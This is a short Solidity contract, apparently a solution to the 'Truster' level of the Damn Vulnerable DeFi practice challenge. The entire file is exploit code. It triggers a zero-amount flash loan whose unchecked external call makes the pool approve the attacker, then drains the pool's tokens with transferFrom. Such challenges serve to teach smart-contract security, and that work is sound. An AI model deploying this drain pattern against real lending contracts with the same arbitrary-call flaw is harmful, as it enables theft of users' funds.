// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";
import "hardhat/console.sol";

contract AttackTrusterPool {
    IERC20 private immutable damnValuableToken;
    TrusterLenderPool private immutable trusterLendingPool;

    constructor(address _damnValuableToken, address _trusterLendingPool) {
        damnValuableToken = IERC20(_damnValuableToken);
        trusterLendingPool = TrusterLenderPool(_trusterLendingPool);
    }

    function execute(
        uint256 borrowAmount,
        address target,
        bytes calldata data
    ) external {
        trusterLendingPool.flashLoan(0, address(this), target, data); // Set approval allowance

        bool success = IERC20(damnValuableToken).transferFrom(
            address(trusterLendingPool),
            msg.sender,
            borrowAmount
        );
        require(success, "failed");
    }
}
